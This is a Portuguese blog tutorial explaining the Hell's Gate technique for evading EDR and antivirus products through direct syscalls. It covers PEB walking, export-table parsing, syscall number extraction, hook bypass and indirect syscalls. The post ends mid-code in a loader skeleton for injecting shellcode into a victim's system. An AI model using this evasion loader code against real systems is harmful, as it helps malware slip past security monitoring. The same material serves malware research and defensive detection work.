---
layout: post
title: Opening the Hells Gate
author: sorahed & spyware
image: /assets/banners/hellsgate.png
description: ""
toc: true
---

# Opening The Hells Gate

Hell's Gate é uma técnica destinada principalmente a evasão de soluções de segurança, como EDRs e Antivírus.

Introduzida por [am0nsec](https://twitter.com/am0nsec) e [RtlMateusz](https://twitter.com/smelly_vx), a Hell's Gate tem como objetivo extrair o ID de uma syscall (ou SSN) dinamicamente em processos de 64-bits. Na arquitetura x86-64, a instrução syscall é usada na transição de código user-mode para kernel-mode. Tendo isso em mente e sabendo que (pelo menos na época em que a técnica foi criada), a grande maioria das soluções de segurança apenas monitoravam por chamadas de API em user-mode, a técnica torna-se uma ótima opção quando falamos de evasão e manter-se indetectável no sistema da vítima.

A Hell's Gate pode ser realizada a partir do seguinte workflow:

- Identificar a `ntdll.dll` do nosso malware através da PEB.
- Iterar pela `ntdll.dll` até encontrar sua export table através dos diretórios de dados da DLL.
- Iterar por essa export table e extrair o syscall id (ou `SSN`) da função alvo.
- Por fim, iterar pelo machine code da função até encontrarmos o grupo de instruções que caracteriza uma syscall.

Porém, antes de prosseguirmos com a técnica em si, precisamos revisar alguns conceitos sobre o sistema operacional Windows. Neste artigo veremos sobre: PEB/TEB, o formato PE, Syscalls, Hook/Unhook de APIs, e, por fim, como a Hell's Gate funciona.

---

# PEB/TEB

A PEB, ou Process Environment Block, é a estrutura que representa um processo em user-mode.

Dentro da PEB, encontramos tudo que aplicações user-land (e nós) precisamos e devemos saber sobre um processo específico. É na PEB que encontramos informações como:

- Se o processo está sendo debuggado atualmente (`BOOLEAN BeingDebugged`).
- Base address do processo (`PVOID ImageBase`).
- Os módulos carregados dentro do processo (`PPEB_LDR_DATA LoaderData`).
- Tamanho da heap do processo (`ULONG HeapSegmentReserve`).
- entre MUITOS outros...

A PEB é definida pela seguinte estrutura:

```c
typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	BOOLEAN Spare;
	HANDLE Mutant;
	PVOID ImageBase;
	PPEB_LDR_DATA LoaderData;

	[...]

	ULONG HeapSegmentReserve;
	ULONG HeapSegmentCommit;
	ULONG HeapDeCommitTotalFreeThreshold;
	ULONG HeapDeCommitFreeBlockThreshold;
	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID** ProcessHeaps;

	[...]

	PVOID LoaderLock;

	[...]
	ULONG GdiHandleBuffer[0x22];
	ULONG PostProcessInitRoutine;
	ULONG TlsExpansionBitmap;
	BYTE TlsExpansionBitmapBits[0x80];
	ULONG SessionId;
} PEB, *PPEB;
```

Como voce já deve ter percebido, o elemento que mais nos interessa é o `PPEB_LDR_DATA LoaderData`, lá encontramos os módulos carregados pelo processo.

Esse campo é do tipo `PPEB_LDR_DATA`, definido pela seguinte estrutura:

```c
typedef struct _PEB_LDR_DATA {
	ULONG Length;
	ULONG Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

Temos 3 elementos do tipo `LIST_ENTRY` (você deve ter percebido que trata-se de uma lista dos módulos carregados). O quê estamos procurando é o `InInitializationOrderModuleList`.

### E como percorremos essa lista até chegar no nosso módulo alvo?

Por ser do tipo `LIST_ENTRY`, esse campo possui um Flink e um Blink.

```c
typedef struct _LIST_ENTRY{
	struct _LIST_ENTRY    *Flink;
	struct _LIST_ENTRY    *Blink;
} LIST_ENTRY, *PLIST_ENTRY;
```

Acessando um Flink (Forward Link), seguimos para o próximo elemento da lista, enquanto um Blink (Backward Link), acessamos o elemento anterior da lista.

Dessa forma, podemos iterar pelos elementos da lista até encontramos nosso alvo, `ntdll.dll`.

### Mas espera, como acessamos a PEB através do nosso código?

Tanto a arquitetura x86, quanto a x64 possuem registradores especiais que contém a TEB de cada thread.

O registrador em questão é o `FS`para x86 e `GS`para x64.

```c
typedef struct _TEB
{
	[NT_TIB] NtTib;
	PVOID EnvironmentPointer;
	[CLIENT_ID] ClientId;
	PVOID ActiveRpcHandle;
	PVOID ThreadLocalStoragePointer;
	[PPEB] ProcessEnvironmentBlock;
	ULONG LastErrorValue;
	[...]
} TEB, *PTEB;
```

Como você deve ter percebido, temos um ponteiro do tipo PPEB denominado `ProcessEnvironmentBlock`, é através dele que acessamos nossa PEB.

Temos duas formas de acessar a PEB, podemos fazer via inline assembly, ou com funções intrínsicas do sistema operacional.

Via Assembly:

```nasm
	MOV EAX, FS:[0x18] ;O offset 0x18 da TEB é um ponteiro para ela mesma.
	MOV EAX, EAX:[EAX + 0x30] ;Aqui acessamos o elemento ProcessEnvironmentBlock.
	MOV EAX, EAX:[EAX + 0x1C] ;Acessamos o  elemento LoaderData.
```

Ou, da forma mais fácil, utilizamos funções intrínsicas:

```c
	PPEB Peb = (PPEB)__readfsdword(0x30); //32bit process
	PPEB Peb = (PPEB)__readgsqword(0x60); //64bit process
	PLDR_MODULE pLoadModule;

	pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink – 0x10); //Mesmo procesos visto anteriormente
```

> *Pelos meus testes, essas funções só estão presentes no Visual Studio, cuidado!*
> 

E dessa forma, temos acesso a PEB e TEB atual de nosso processo e thread, respectivamente.

# PE (Portable Executable)

PE, ou Portable Executable, é um modelo padrão de armazenamento de dados em arquivos, onde os mesmos contém todas as informações necessárias para sua leitura e execução através do sistema operacional.

> *Esse tipo de arquivo é identificado pelos bytes "0x4D" e "0x5A" (MZ) como magic numbers. (Ou 0x5a0x4d (ZM) em Little Endian)*
> 

O modelo é nada mais que uma formatação desses bytes em uma espécie de estrutura, sendo ela dividida em: (MS-)DOS Header, DOS Stub, NT Headers (PE Signature, File/COFF Header e Optional Header), Section table e as Sections.

![Untitled](/assets/img/Untitled.png)

> Devido ao escopo desse artigo, vamos manter nosso foco no **Optional Header.**
> 

# Optional Header

A partir do File Header, os próximos 224 bytes são destinados ao Optional Header do PE.

> *Apesar do nome, essa estrutura não é opcional, ela contém informações e caracterísitcas do executável.*
> 

Dentro do Optional Header, podemos encontrar dados como o tamanho da stack inicial, o entrypoint do programa, base address, informações sobre alinhamento de seções, tamanho da imagem, o campo DllCharacteristics (Onde ficam os bits referentes a ASLR, NX) e muitas outras coisas.

A estrutura que representa esse Header é a seguinte:

```c
typedef struct _IMAGE_OPTIONAL_HEADER {
    //
    // Standard fields.
    //
    USHORT  Magic;
    UCHAR   MajorLinkerVersion;
    UCHAR   MinorLinkerVersion;
    ULONG   SizeOfCode;
    ULONG   SizeOfInitializedData;
    ULONG   SizeOfUninitializedData;
    ULONG   AddressOfEntryPoint;
    ULONG   BaseOfCode;
    ULONG   BaseOfData;
    //
    // NT additional fields.
    //
    ULONG   ImageBase;
    ULONG   SectionAlignment;
    ULONG   FileAlignment;
    USHORT  MajorOperatingSystemVersion;
    USHORT  MinorOperatingSystemVersion;
    USHORT  MajorImageVersion;
    USHORT  MinorImageVersion;
    USHORT  MajorSubsystemVersion;
    USHORT  MinorSubsystemVersion;
    ULONG   Reserved1;
    ULONG   SizeOfImage;
    ULONG   SizeOfHeaders;
    ULONG   CheckSum;
    USHORT  Subsystem;
    USHORT  DllCharacteristics;
    ULONG   SizeOfStackReserve;
    ULONG   SizeOfStackCommit;
    ULONG   SizeOfHeapReserve;
    ULONG   SizeOfHeapCommit;
    ULONG   LoaderFlags;
    ULONG   NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;
```

Como você deve ter notado, essa estrutura está dividida em duas parte, por que isso?

Acontece que os chamados "Standard Fields", são campos comuns para o COFF (Common Object File Format), modelo esse que executáveis UNIX-like utilizam. Já os "NT Additional Fields" são campos adicionais de executáveis do sistema Windows.

Devido ao escopo do artigo, o campo que nos interessa agora é o `IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];`.

O campo em questão trata-se de um array de diversas estruturas do tipo `IMAGE_DATA_DIRECTORY` (diretórios de dados da aplicação). Localizado no final do Optional Header, esse array permite até 16 entradas, sendo 11 delas preenchidas por padrão.

O array é definido da seguinte forma:

```c
// Directory Entries

// Export Directory
#define IMAGE_DIRECTORY_ENTRY_EXPORT         0
// Import Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT         1
// Resource Directory
#define IMAGE_DIRECTORY_ENTRY_RESOURCE       2
// Exception Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION      3
// Security Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY       4
// Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_BASERELOC      5
// Debug Directory
#define IMAGE_DIRECTORY_ENTRY_DEBUG          6
// Description String
#define IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7
// Machine Value (MIPS GP)
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8
// TLS Directory
#define IMAGE_DIRECTORY_ENTRY_TLS            9
//Load Configuration Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10

```

Como você já deve imaginar, estamos buscando pelo índice de número 0 desse array.

Já a estrutura `IMAGE_DATA_DIRECTORY` (contida em cada elemento desse array), possui os campos Virtual Address e Size, ou seja:

```c
typedef struct _IMAGE_DATA_DIRECTORY {
    ULONG   VirtualAddress;
    ULONG   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

```

Então, para acessar o conteúdo da Export Table por exemplo, temos o seguinte snippet:

```c
#include
#include "peb.h"
int main(VOID) {
	PPEB Peb = (PPEB)__readgsqword(0x60);
	PLDR_MODULE pLoadModule;
	PBYTE ImageBase;
	PIMAGE_DOS_HEADER Dos = NULL;
	PIMAGE_NT_HEADERS Nt = NULL;
	PIMAGE_FILE_HEADER File = NULL;
	PIMAGE_OPTIONAL_HEADER Optional = NULL;
	PIMAGE_EXPORT_DIRECTORY ExportTable = NULL;

	pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 16);

	ImageBase = (PBYTE)pLoadModule->BaseAddress;

	Dos = (PIMAGE_DOS_HEADER)ImageBase;
	if (Dos->e_magic != IMAGE_DOS_SIGNATURE)
		return 1;

	Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos->e_lfanew);

	File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos->e_lfanew + sizeof(DWORD));

	Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + sizeof(IMAGE_FILE_HEADER));

	ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional->DataDirectory[0].VirtualAddress);

	return ERROR_SUCCESS;
}

```

Onde, a partir da PEB do nosso processo atual, percorremos a `LINKED_LIST InMemoryOrderModuleList` procurando pela ntdll (Flink -16).

Após encontrada, pegamos seu base address, realizamos uma verificação afim de comparar seu magic number com algo que não seja MZ.

Feita essa verificação, atribuímos sua assinatura PE à variável Nt e adicionamos uma `DWORD` (4 bytes) ao endereço, pois dessa forma, chegamos ao offset do File header da DLL.

```bash
$ hd -s 0x3c -n16 putty.exe
0000003c  f8 00 00 00 0e 1f ba 0e  00 b4 09 cd 21 b8 01 4c  |............!..L|
```

> *Como podem ver, o offset 0x3c+4 é a assinatura "completa", então a partir de 0e, estaríamos no File Header do arquivo.*
> 

Adicionando o endereço do File Header junto ao tamanho do mesmo, chegamos finalmente ao Optional Header da DLL.

Agora então, só precisamos acessar o endereço virtual do diretório de dados de exportação da dll, tendo assim acesso aos endereços de funções que a mesma exporta.

---

## O que são syscalls?

Windows System Calls ou Syscalls servem como uma interface para que os programas interajam com o sistema, permitindo que eles solicitem serviços específicos, como ler ou gravar em um arquivo, cria um novo processo ou alocar memória. Em um geral as syscalls são as API’s que executam as ações quando uma função WinAPI é chamada. Por exemplo, a syscall `NtAllocateVirtualMemory` é acionada quando as funções `VirtualAlloc` ou `VirtualAllocEx` são chamadas. Em seguida, essa syscall move os parâmetros fornecidos pelo usuário na chamada da função para o kernel do Windows, executa a ção solicitada e retorna o resultado para o programa.

Todas as syscalls retornam um valor NTSTATUS que indica o código de erro. `STATUS_SUCESS` (zero) é retornado se a syscall tiver êxito na execução da operação.

## Por que ultilizar Syscalls?

O uso de syscalls fornece acesso de baixo nível ao sistema operacional, o que pode ser vantajoso para a execução de ações que não estão disponíveis ou que são mais complexas de serem realizadas com WinAPIs padrões. Por exemplo, a syscall `NtCreateUserProcess` fornece opções adicionais ao criar processos que a WinAPI `CreateProcess`  não pode.

## Syscall Service Number (SSN)

Cada syscall tem um número de syscall especial, conhecido como *System Service Number* ou SSN.

Esse número serve como index na `KiServiceTable` para threads não-gui e `W32PServiceTable` para threads GUI.

Esses números de syscall são o que o kernel usa para distinguir as syscalls umas das outras. Por exemplo, a syscall `NtAllocateVirtualMemory` terá um SNN de 24, enquanto a `NtProtectVirtualMemory` terá um SSN de 80. Esses números são o que o kernel usa para diferenciar a `NtAllocateVirtualMemory` da `NtProtectVirtualMemory`.

## Syscalls em memória

Em uma máquina, os SSNs não são completamente arbitrários e têm uma relação entre si. Cada número de syscall na memória é igual ao SSN anterior + 1. Por exemplo, O SSN da syscall B é igual ao SSN da syscall A mais um. Isso também é verdadeiro quando se aproxima a syscall do outro lado, onde o SSN da syscall C será o da syscall D menos um.

Essa relação é mostrada na imagem a seguir, em que o SSN de `ZwAxxessCheck` é 0 e o SSN da próxima syscall, `NtWorkerFactoryWorkerReady`, é 1 e assim por diante.

![Untitled](/assets/img/Untitled%201.png)

## Estrutura de uma syscall (x64)

A estrutura de uma syscall é geralmente a mesma e se parecerá com o trecho mostrado abaixo.

```nasm
mov r10, rcx
mov eax, SSN
syscall
```

Por exemplo, o `NtAllocateVirtualMemory` em um sistema de 64 bits é mostrado abaixo.

![Untitled](/assets/img/Untitled%202.png)

E `NtProtectedVirtualMemory`

![Untitled](/assets/img/Untitled%203.png)

## Explicando as instruções das syscalls

A primeira linha da syscall move o valor do primeiro parâmetro, salvo em `RCX`, para o registrador `R10`. Posteriormente, o SSN da syscall é movido para o registrador EAX. Por fim, a instrução `syscall` é executada.

Por convenção, rcx deve ser movido a r10, pois o return address deve ser sempre `rcx`(SYSRET seta o `rip` para `rcx`) e os argumentos em `r10`.

A instrução `syscall` em sistemas de 64 bits ou `sysenter` em sistemas de 32 bits são as instruções que iniciam syscall. A execução da instrução `syscall` fará com que o programa transfira o controle do modo de usuário para o modo de kernel. O kernel executará a ação solicitada e retornará o controle ao programa do modo de usuário quando concluído.

Em um nível mais baixo ainda a instrução `syscall` nada mais faz que mudar o conteúdo de `RIP` para o conteúdo de `IA32_LSTAR MSR` (`0xC0000082`) ou seja, o principal system call `didpatcher` da arquitetura, `KiSystemCall64Shadow`, mas como isso não entra no escopo do artigo não vamos nos aprofundar mais.

---

# Userland Hooking

As soluções de segurança host-based frequentemente executam API hooking em syscalls para permitir a análise e o monitoramento de programas em tempo de execução. Por exemplo, ao hookar a syscall `NtProtectVirtualMemory`, a solução de segurança pode detectar chamadas WinAPI de nivel mais alto, como `VirtualProtect`, mesmo quando ela está oculta na import address table(IAT).

Além disso, as soluções de segurança podem acessar qualquer região da memória que esteja definida como executável e examiná-la em busca de assinaturas. Os hooks em userland geralmente são instalados antes da instrução `syscall`, que é a ultima etapa de uma syscall no user mode.

Os hooks em kernel mode podem ser implementados após a execução, depois que o fluxo é transferido para o kernel. No entanto, o Windows Patch Guard e outras mitigações dificultam a aplicação de patches na memória do kernel por aplicativos de terceiros, tornando a tarefa difícil, se não impossível. A inserção dos hooks em kernel mode também pode resultar em implicações de estabilidade e causar um comportamento inesperado, razão pela qual raramente é implementada.

## Bypassing Userland Syscall Hooks

Usar direct syscalls é um metódo de contornar os userland hooks. Por exemplo, usar `NtAllocateVirtualMemory` em vez de `VirtualAlloc`/Ex ao alocar memória para o payload. Há outras maneiras de chamar as syscalls furtivamente:

- Ultilizando Direct Syscalls
- Ultilizando Indirect Syscalls
- Unhooking (Talvez role um paper futuro sobre técnicas de unhooking)

## Direct Syscalls

Evasão de hooks em user mode pode ser feito de forma que se obtenha uma versão da função da syscall codificada em assembly e chamando essa syscall criada diretamente em um arquivo assembly. O desafio está em terminar o número de serviço da syscall(SSN), pois esse número varia de um sistema para outro. Para superar isso, o SSN pode ser hard-coded no arquivo assembly ou calculado dinamicamente durante o tempo de execução. Um exemplo de uma syscall criada em um arquivo assembly(.asm) é apresentado a seguir.

Em vez de chamar `NtAllocateVirtualMemory` com `GetProcAddress` e `GetModuleHandle`, como feito anteriormente, a função assembly abaixo pode ser utilizada para obter o mesmo resultado. Isso elimina a necessidade de chamar `NtAllocateVirtualMemory` de dentro do espaço de endereço NTDLL onde os hooks estão instalados, evitando assim os hooks.

```nasm
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn do NtAllocateVirtualMemory)
    syscall
    ret
NtAllocateVirtualMemory ENDP

NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn do NtProtectVirtualMemory)
    syscall
    ret
NtProtectVirtualMemory ENDP

// outras syscalls
```

Esse método é ultizado na técnica que vamos ver a seguir, onde os SSN’s das syscalls ultilizadas para fazer um process injection por exemplo, são resolvidos em tempo de execução.

## Indirect Syscalls

Indirect Sysscalls são implementadas de forma semelhante as direct syscalls, em que os arquivos assembly são criados de forma manual primeiro. A diferença está na ausência da instrução syscall dentro da função assembly, que, em vez disso, é pulada. 

![Untitled](/assets/img/Untitled%204.png)

As funções de assembly para `NtAllocateVirtualMemory` e `NtProtectVirtualMemory` são mostradas abaixo.

```nasm
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn do NtAllocateVirtualMemory)
    jmp (endereço da instrução syscall)
    ret
NtAllocateVirtualMemory ENDP

NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtProtectVirtualMemory)
    jmp (endereço da instrução syscall)
    ret
NtProtectVirtualMemory ENDP
```

## As vantagens de se ultilizar indirect syscalls

A vantagem de executar indirect syscall em vez de direct syscalls é que as soluções de segurança procurarão por syscalls sendo chamadas de fora do espaço de endereço da NTDLL e as considerarão suspeitas. Com as indirect syscalls, a instrução `syscall` estará sendo executada a partir do endereço da NTDLL, como deveriam ser as syscalls normais. Portando, as indirect syscalls têm maior probabilidade de passar despercebidas pelas soluções de segurança do que as direct syscalls.

Essa abordagem de indirect syscalls, é abordada em uma outra técnica semelhante ao Hells Gate, que vamos ver, a chamada HellsHall, onde é feito o mesmo processo do HellsGate, mas com o uso de indirect syscalls.

## Unhooking

Unhooking é uma outra abordagem para evitar os hooks, na qual a biblioteca NTDLL com os hooks instalados na memória é substituída por uma versão sem hook. A versão sem hook pode ser obtida em vários lugares. mas uma das abordagens mais comuns é carregá-la diretamente do disco. Ao fazer isso, todos os hooks colocados dentro da NTDLL serão removidos.

![Untitled](/assets/img/Untitled%205.png)

---

# Hell’s Gate Na Prática

Como discutido anteriormente o uso de direct syscalls é uma forma de contornar userland hooks executando manualmente as instruções assembly de uma syscalls. O Hells’Gate é uma técnica utilizada parar realizar direct syscalls. Ao ler a `ntdll.dll`, o Hell’s Gate pode localizar dinamicamente as syscalls e executá-las a partir do binário.

A abordagem do Hell's Gate funciona buscando o SSN nos opcodes da syscall hookada, que são então chamados em suas funções assembly.

## Syscall Structure

O código do Hell’s Gate começa definindo a estrutura [VX_TABLE_ENTRY](https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L8). Essa estrutura representa uma syscall e contém o endereço, o valor de hash do nome da syscall e o SSN.

```c
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;             // The address of a syscall function
	DWORD64 dwHash;               // The hash value of the syscall name
	WORD    wSystemCall;          // The SSN of the syscall
} VX_TABL
```

Por exemplo, NtAllocateVirtualMemory seria representado como VX_TABLE_ENTRY NtAllocateVirtualMemory.

## Syscalls Table

As syscalls que estão sendo usadas são mantidas dentro de outra estrutura, [VX_TABLE](https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L14). Como cada membro dentro de `VX_TABLE` é uma syscall, cada membro será do tipo `VX_TABLE_ENTRY`.

```c
typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;
```

## Opening the Hell’s Gate

A função principal começa chamando a função [RtlGetThreadEnvironmentBlock](https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L50) que é usada para obter o TEB. Isso é necessário para retornar o endereço base da `ntdll.dll` por meio do PEB (lembre-se de que o PEB está localizado dentro do TEB, no elemento `PPEB ProcessEnvironmentBlock`). Em seguida, o diretório de exportação do `ntdll.dll` é obtido usando [GetImageExportDirectory](https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L60). O diretório de exportação é encontrado analisando os cabeçalhos DOS e Nt. (Que foi visto como acessar no começo do paper !)

Em seguida, para cada syscall, o membro `dwHash` é inicializado (por exemplo, `NtAllocateVirtualMemory.dwHash`) com seu valor de hash correspondente. A cada inicialização, a função `GetVxTableEntry` é chamada, como mostrado abaixo. A função foi dividida em várias partes para simplificar o processo de explicação.

### **GetVxTableEntry - Part 1**

```c
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions    = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames        = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales  = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName  = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// ...
		}
	}

	return TRUE;
}
```

A primeira parte da função procura um valor de hash Djb2 igual ao hash da syscall, `pVxTableEntry->dwHash`. Quando houver uma correspondência, o endereço da syscall será salvo em `pVxTableEntry->pAddress`. A segunda parte da função é onde de fato reside a trick do Hell's Gate.

### GetVxTableEntry - Part 2

```c

			WORD cw = 0;
			while (TRUE) {
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
```

A segunda parte começa com um loop while após encontrar o endereço da syscall, `pFunctionAddress`. O loop while procura os bytes `0x4c, 0x8b, 0xd1, 0xb8`, que são opcodes para `mov r10, rcx e mov rcx, ssn`, que são o início de uma syscall unhookada.

No caso em que a syscall é hookada, os opcodes podem não corresponder devido ao fato de o hook ter sido adicionado por soluções de segurança antes da instrução `syscall`. Para resolver esse problema, o Hell's Gate tenta corresponder aos opcodes e, se não for encontrada nenhuma correspondência, a variável `cw` é incrementada, o que é adicionado ao endereço da syscall na iteração subsequente do loop. Essa progressão continua, descendo um byte de cada vez até que as instruções `mov r10, rcx` e `mov rcx, ssn` sejam alcançadas. A imagem abaixo ilustra como o Hell's Gate encontra os opcodes percorrendo o hook.

![Untitled](/assets/img/Untitled%206.png)

## Estabelecendo limites

Para evitar que ele próprio pesquise demais e obtenha um SSN diferente para uma syscall diferente, duas declarações `if` são feitas no início do loop while para verificar as instruções `syscall` e `ret` localizadas no final da syscall. Se essa busca chegar a uma dessas instruções e os opcodes `0x4c, 0x8b, 0xd1, 0xb8` não tiverem sido identificados a resolução do SSN falhará.

```c

if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
	return FALSE;

if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
	return FALSE;
```

## Calculando e armazenando o SSN

Por outro lado, se houver uma correspondência bem sucedida para os opcodes, o Hell’s Gate vai calcular o número da syscall e o salvará em `pVxTableEntry→wSystemCall`.

A função primeiro usa o left shit operator(`<<`) para deslocar os bits da variável high para a esquerda 8 vezes. Em seguida, usa o operador OR bitwise( `|` ) para comparar cada bit do primeiro operando (sendo `high << 8`) com o bit correspondente do segundo operando (sendo low).

```c
pVxTableEntry->wSystemCall = (high << 8) | low;
```

Para entendermos melhor isso, vamos mostrar a seguir um exemplo ultilizando a sycall NtProtectVirtualMemory para demonstrar essa abordagem, de como o Hell’s Gate calcula o SSN.

![Untitled](/assets/img/Untitled%207.png)

A imagem acima é simplificada para o trecho abaixo.

```nasm
00007FFCC42C4570 | 4C:8BD1                          | mov r10,rcx                                    |
00007FFCC42C4573 | B8 50000000                      | mov eax,50                                     | 50:'P'
00007FFCC42C4582 | 0F05                             | syscall                                        |
00007FFCC42C4584 | C3                               | ret                                            |
```

Os bytes `C4C:8BD1 B8 50000000` correspondem aos seguintes offsets:

`4C` é o offset 0, `8B` é o offset 1 e `D1` é o offset 2, `B8` é o offset 3, `50` é o offset 4, `00` é o offset 5 e assim por diante. A função `GetVxTableEntry` especifica que as variáveis high e low têm um offset de 5 e 4, respectivamente.

```c
BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); // Offset 5
BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); // Offset 4
```

Checando o valor no offset 5 revela que ele é `0x00`, enquanto o offset 4 é `0x50`. Isso significa que o valor de high é `0x00` e o de low é `0x50`. Portanto, o SSN é igual a `(0x00 << 8`) |  `0x50`.

![Untitled](/assets/img/Untitled%208.png)

O resultado da operação bitwise corresponde ao número SSN de `NtProtectVirtualMemory`, que é 50 em hexadecimal.

![Untitled](/assets/img/Untitled%209.png)

## VxMoveMemory

E no código também esta presente a função `VxMoveMemory` , que o seu objetivo é copiar um bloco de memória de um lugar x para o lugar y,  ela é semelhante em  à função `memcpy` da biblioteca C padrão, mas tem uma implementação personalizada para este código. A função é usada para copiar o shellcode na memória.

```c
PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}
```

## Chamando a syscall

Agora que o Hell's Gate inicializou totalmente a estrutura `VX_TABLE_ENTRY` da syscall alvo, ele pode chamá-la. Para fazer isso, o Hell's Gate usa duas funções **assembly** de 64 bits: `HellsGate` e `HellDescent`, mostradas no arquivo [hellsgate.asm](https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm).

```nasm
data
	wSystemCall DWORD 000h              ; this is a global variable used to keep the SSN of a syscall

.code
	HellsGate PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx            ; updating the 'wSystemCall' variable with input argument (ecx register's value)
		ret
	HellsGate ENDP

	HellDescent PROC
		mov r10, rcx
		mov eax, wSystemCall            ; `wSystemCall` is the SSN of the syscall to call
		syscall
		ret
	HellDescent ENDP
end
```

Para chamar uma syscall, primeiro o número da syscall precisa ser passado para a função `HellsGate`. Isso o salva na variável global `wSystemCall` para uso futuro. Em seguida, o `HellDescent` é usado para chamar a syscall, passando os parâmetros da syscall. Isso é demonstrado na função [Payload](https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L166).

## Gran Finale

E por fim, juntando todas as peças desse quebra cabeça, temos o exemplo da técnica aplicada no trecho de código a seguir.

```c
#pragma once
#include <Windows.h>
#include "structs.h"

#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")

unsigned char payload[] = {};
unsigned int payload_len = sizeof(payload);

/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Protótipo das Funções
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
